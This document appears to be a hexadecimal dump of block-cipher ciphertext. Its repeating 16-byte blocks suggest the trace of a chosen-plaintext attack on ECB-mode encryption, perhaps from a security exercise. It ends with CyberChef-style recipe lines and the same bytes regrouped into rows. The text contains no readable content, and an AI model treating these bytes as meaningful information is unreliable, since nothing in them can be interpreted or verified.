c4 ba cd c5 ed 93 57 56 4e 51 05 dd 7e 64 d0 dc c8 68 25 36 92 ad fc bd 37 96 d1 bf 8a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 af c2 62 8c 61 40 26 6d b6 80 ae e2 b5 7a 9b 88 64 86 95 4a ea 46 fb 93 e9 ab 85 84 5b 4f 4b d0 d7 ff 2b 72 54 53 fc 29 47 01 e5 1f 5d 7c 0f 8e 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 cd 43 a4 71 66 c6 3b 50 f4 5e e7 28 b2 71 f5 22 89 6d e9 08 84 f8 61 08 b1 67 f8 b4 ae a5 d7 63 91 72 32 05 14 83 e6 8e 45 8f d0 66 16 7b 30 a3 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 88 16 c6 1e 2b c6 37 26 60 f8 79 c4 5f 23 77 7e a0 95 22 f3 01 cf 9d 36 ac 70 23 f1 65 94 8c 5a 97 39 cd 90 52 2f a7 a8 6f 95 77 3b 56 f9 f8 c0 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 36 33 69 47 dd ff 07 3d 13 2c 22 39 1e 65 51 08 ca 8c f4 e6 10 91 3a ba e3 9a 06 76 19 20 4a 5a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 87 52 7d 43 77 33 98 c6 ef 1f 11 4a 51 3a 00 28 75 fd 50 44 fd 06 3d 26 f6 bb 7f 73 4b 41 c8 99 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 c6 47 6e 41 96 19 d3 87 f4 57 73 12 25 f1 5f e1 62 23 a1 4d 9c 42 91 b9 87 75 b0 3f bc 73 d4 ed d8 ae 51 d7 da 71 b2 b0 83 d9 19 a0 d7 b8 8b 98 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f0 4d ce c4 eb 6b c1 7e 9a 2e ea 59 13 ba cd f2 42 57 a3 43 da ad aa f2 c0 e3 a1 d7 1c e0 3d d1 7b 7b ac a6 55 f2 98 a3 21 e9 0e 3f 7a 60 d4 d8 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 04 25 5a e1 61 58 d1 5d e5 13 ca dd 2d 1c 96 e2 a7 73 f3 18 50 94 aa 01 40 8f 1f 97 d0 37 d3 85 67 8c 57 73 ec c2 8f 87 0e 4f 4e bc 6c 80 70 a4 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 e3 df 36 1c 63 93 61 9a c7 b3 e9 d0 97 b1 11 ae a7 7e 8e d1 aa be 0b 5d 05 c4 ff e6 ac 14 23 ab 47 8e b1 a1 fe 26 1a 2c 6c 15 06 11 09 b3 fe da 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 cd 69 9c 6c f2 fb 7e 5f 43 de 21 06 dd b9 4e 62 bd fa 10 54 ec 68 51 5c f9 6f 2a 55 44 59 19 47 90 4f 4b 2a bf 2c 2d 76 86 aa 72 a5 31 51 c9 70 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 a7 b4 89 5b f7 fb b7 1d c0 9b 34 17 73 8f d6 78 48 79 9a 07 b1 d2 9b 59 82 01 5c 93 55 c2 e0 0e ad ed 9b db ac a6 a7 3b 71 b3 5a 01 0d 2c 4c 57 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 87 00 91 36 3e ff 91 25 f6 98 cd 2e d5 0b fd 28 9a 2e 2b 5d b6 f3 1f 19 a1 4f 75 67 8e ad aa 90 42 49 b9 3e 4d ea 09 09 47 99 95 b9 c4 4b 35 1a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 e7 0a f0 b6 0e 32 73 f4 b7 91 77 d5 90 36 59 4c 29 28 7f 3c c5 47 9e 12 e6 6f 31 c8 63 b1 80 47 56 d5 73 2d c8 c7 70 f6 43 97 15 8b c1 7a 6e 66 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 ce 3c 88 30 21 6f 40 eb 15 99 9a 50 9b 1b 6b f2 ac 3b 87 1c 1c 44 83 86 b4 5c d3 6d 9e 8f 72 f4 65 51 49 bb ba 21 23 d8 9d 95 41 7e a2 7f 3a 7b 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 46 2f ec f8 84 b5 43 1f 6d b8 f3 d8 d6 42 8c 00 41 c0 98 c4 ba cd c5 ed 93 57 56 4e 51 05 dd 7e 64 d0 dc c8 68 25 36 92 ad fc bd 37 96 d1 bf 8a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 8e 59 c7 cc 6f 7a 42 39 27 48 b5 30 01 4e 12 5f 64 86 95 4a ea 46 fb 93 e9 ab 85 84 5b 4f 4b d0 d7 ff 2b 72 54 53 fc 29 47 01 e5 1f 5d 7c 0f 8e 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 85 81 6b 43 e9 32 24 7f 69 76 b6 43 b0 18 ca 57 89 6d e9 08 84 f8 61 08 b1 67 f8 b4 ae a5 d7 63 91 72 32 05 14 83 e6 8e 45 8f d0 66 16 7b 30 a3 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f5 60 54 24 74 c9 b0 60 31 b5 fd a3 6f 68 7a cf a0 95 22 f3 01 cf 9d 36 ac 70 23 f1 65 94 8c 5a 97 39 cd 90 52 2f a7 a8 6f 95 77 3b 56 f9 f8 c0 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 36 33 69 47 dd ff 07 3d 13 2c 22 39 1e 65 51 08 ca 8c f4 e6 10 91 3a ba e3 9a 06 76 19 20 4a 5a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 87 52 7d 43 77 33 98 c6 ef 1f 11 4a 51 3a 00 28 75 fd 50 44 fd 06 3d 26 f6 bb 7f 73 4b 41 c8 99 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b c6 47 6e 41 96 19 d3 87 f4 57 73 12 25 f1 5f e1 62 23 a1 4d 9c 42 91 b9 87 75 b0 3f bc 73 d4 ed d8 ae 51 d7 da 71 b2 b0 83 d9 19 a0 d7 b8 8b 98 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f0 4d ce c4 eb 6b c1 7e 9a 2e ea 59 13 ba cd f2 42 57 a3 43 da ad aa f2 c0 e3 a1 d7 1c e0 3d d1 7b 7b ac a6 55 f2 98 a3 21 e9 0e 3f 7a 60 d4 d8 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 04 25 5a e1 61 58 d1 5d e5 13 ca dd 2d 1c 96 e2 a7 73 f3 18 50 94 aa 01 40 8f 1f 97 d0 37 d3 85 67 8c 57 73 ec c2 8f 87 0e 4f 4e bc 6c 80 70 a4 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b e3 df 36 1c 63 93 61 9a c7 b3 e9 d0 97 b1 11 ae a7 7e 8e d1 aa be 0b 5d 05 c4 ff e6 ac 14 23 ab 47 8e b1 a1 fe 26 1a 2c 6c 15 06 11 09 b3 fe da 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b cd 69 9c 6c f2 fb 7e 5f 43 de 21 06 dd b9 4e 62 bd fa 10 54 ec 68 51 5c f9 6f 2a 55 44 59 19 47 90 4f 4b 2a bf 2c 2d 76 86 aa 72 a5 31 51 c9 70 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b a7 b4 89 5b f7 fb b7 1d c0 9b 34 17 73 8f d6 78 48 79 9a 07 b1 d2 9b 59 82 01 5c 93 55 c2 e0 0e ad ed 9b db ac a6 a7 3b 71 b3 5a 01 0d 2c 4c 57 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 87 00 91 36 3e ff 91 25 f6 98 cd 2e d5 0b fd 28 9a 2e 2b 5d b6 f3 1f 19 a1 4f 75 67 8e ad aa 90 42 49 b9 3e 4d ea 09 09 47 99 95 b9 c4 4b 35 1a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b e7 0a f0 b6 0e 32 73 f4 b7 91 77 d5 90 36 59 4c 29 28 7f 3c c5 47 9e 12 e6 6f 31 c8 63 b1 80 47 56 d5 73 2d c8 c7 70 f6 43 97 15 8b c1 7a 6e 66 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b ce 3c 88 30 21 6f 40 eb 15 99 9a 50 9b 1b 6b f2 ac 3b 87 1c 1c 44 83 86 b4 5c d3 6d 9e 8f 72 f4 65 51 49 bb ba 21 23 d8 9d 95 41 7e a2 7f 3a 7b 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 46 2f ec f8 84 b5 43 1f 6d b8 f3 d8 d6 42 8c 00 41 c0 98 c4 ba cd c5 ed 93 57 56 4e 51 05 dd 7e 64 d0 dc c8 68 25 36 92 ad fc bd 37 96 d1 bf 8a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 8e 59 c7 cc 6f 7a 42 39 27 48 b5 30 01 4e 12 5f 64 86 95 4a ea 46 fb 93 e9 ab 85 84 5b 4f 4b d0 d7 ff 2b 72 54 53 fc 29 47 01 e5 1f 5d 7c 0f 8e 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 85 81 6b 43 e9 32 24 7f 69 76 b6 43 b0 18 ca 57 89 6d e9 08 84 f8 61 08 b1 67 f8 b4 ae a5 d7 63 91 72 32 05 14 83 e6 8e 45 8f d0 66 16 7b 30 a3 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f5 60 54 24 74 c9 b0 60 31 b5 fd a3 6f 68 7a cf a0 95 22 f3 01 cf 9d 36 ac 70 23 f1 65 94 8c 5a 97 39 cd 90 52 2f a7 a8 6f 95 77 3b 56 f9 f8 c0 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 36 33 69 47 dd ff 07 3d 13 2c 22 39 1e 65 51 08 ca 8c f4 e6 10 91 3a ba e3 9a 06 76 19 20 4a 5a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 87 52 7d 43 77 33 98 c6 ef 1f 11 4a 51 3a 00 28 75 fd 50 44 fd 06 3d 26 f6 bb 7f 73 4b 41 c8 99 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b c6 47 6e 41 96 19 d3 87 f4 57 73 12 25 f1 5f e1 62 23 a1 4d 9c 42 91 b9 87 75 b0 3f bc 73 d4 ed d8 ae 51 d7 da 71 b2 b0 83 d9 19 a0 d7 b8 8b 98 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f0 4d ce c4 eb 6b c1 7e 9a 2e ea 59 13 ba cd f2 42 57 a3 43 da ad aa f2 c0 e3 a1 d7 1c e0 3d d1 7b 7b ac a6 55 f2 98 a3 21 e9 0e 3f 7a 60 d4 d8 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 04 25 5a e1 61 58 d1 5d e5 13 ca dd 2d 1c 96 e2 a7 73 f3 18 50 94 aa 01 40 8f 1f 97 d0 37 d3 85 67 8c 57 73 ec c2 8f 87 0e 4f 4e bc 6c 80 70 a4 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b e3 df 36 1c 63 93 61 9a c7 b3 e9 d0 97 b1 11 ae a7 7e 8e d1 aa be 0b 5d 05 c4 ff e6 ac 14 23 ab 47 8e b1 a1 fe 26 1a 2c 6c 15 06 11 09 b3 fe da 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b cd 69 9c 6c f2 fb 7e 5f 43 de 21 06 dd b9 4e 62 bd fa 10 54 ec 68 51 5c f9 6f 2a 55 44 59 19 47 90 4f 4b 2a bf 2c 2d 76 86 aa 72 a5 31 51 c9 70 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b a7 b4 89 5b f7 fb b7 1d c0 9b 34 17 73 8f d6 78 48 79 9a 07 b1 d2 9b 59 82 01 5c 93 55 c2 e0 0e ad ed 9b db ac a6 a7 3b 71 b3 5a 01 0d 2c 4c 57 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 87 00 91 36 3e ff 91 25 f6 98 cd 2e d5 0b fd 28 9a 2e 2b 5d b6 f3 1f 19 a1 4f 75 67 8e ad aa 90 42 49 b9 3e 4d ea 09 09 47 99 95 b9 c4 4b 35 1a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b e7 0a f0 b6 0e 32 73 f4 b7 91 77 d5 90 36 59 4c 29 28 7f 3c c5 47 9e 12 e6 6f 31 c8 63 b1 80 47 56 d5 73 2d c8 c7 70 f6 43 97 15 8b c1 7a 6e 66 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b ce 3c 88 30 21 6f 40 eb 15 99 9a 50 9b 1b 6b f2 ac 3b 87 1c 1c 44 83 86 b4 5c d3 6d 9e 8f 72 f4 65 51 49 bb ba 21 23 d8 9d 95 41 7e a2 7f 3a 7b 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 46 2f ec f8 84 b5 43 1f 6d b8 f3 d8 d6 42 8c 00 41 c0 98 c4 ba cd c5 ed 93 57 56 4e 51 05 dd 7e 64 d0 dc c8 68 25 36 92 ad fc bd 37 96 d1 bf 8a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 8e 59 c7 cc 6f 7a 42 39 27 48 b5 30 01 4e 12 5f 64 86 95 4a ea 46 fb 93 e9 ab 85 84 5b 4f 4b d0 d7 ff 2b 72 54 53 fc 29 47 01 e5 1f 5d 7c 0f 8e 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 85 81 6b 43 e9 32 24 7f 69 76 b6 43 b0 18 ca 57 89 6d e9 08 84 f8 61 08 b1 67 f8 b4 ae a5 d7 63 91 72 32 05 14 83 e6 8e 45 8f d0 66 16 7b 30 a3 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f5 60 54 24 74 c9 b0 60 31 b5 fd a3 6f 68 7a cf a0 95 22 f3 01 cf 9d 36 ac 70 23 f1 65 94 8c 5a 97 39 cd 90 52 2f a7 a8 6f 95 77 3b 56 f9 f8 c0 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 36 33 69 47 dd ff 07 3d 13 2c 22 39 1e 65 51 08 ca 8c f4 e6 10 91 3a ba e3 9a 06 76 19 20 4a 5a 1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 5f 22 a7 27 f6 25 41 9a 46 6f 9a f5 38 91 f9 b2 f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b f6 33 e6 b0 5f 86 62 26 b8 63 81 71 12 b1 c9 2b 87 52 7d 43 77 33 98 c6 ef 1f 11 4a 51 3a 00 28 75 fd 50 44 fd 06 3d 26 f6 bb 7f 73 4b 41 c8 99
+
+*FORK - SPLIT DELIMITER \N - MERGE DELIMITER \N\N
+*TO HEX - DELIMITER NONE - BYTES PER LINE 16
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+a377c30a0d964888a1b9d4535ea0f8d4
+bdfa1054ec68515cf96f2a5544591947
+904f4b2abf2c2d7686aa72a53151c970
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+98b0d620b20d6114979b77e24d8b1d3a
+48799a07b1d29b5982015c9355c2e00e
+aded9bdbaca6a73b71b35a010d2c4c57
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+7c126a31294d678cab9b9b0efe443b75
+9a2e2b5db6f31f19a14f75678eadaa90
+4249b93e4dea0909479995b9c44b351a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+b4dbdd7cb1035469d6acb2f9520070c7
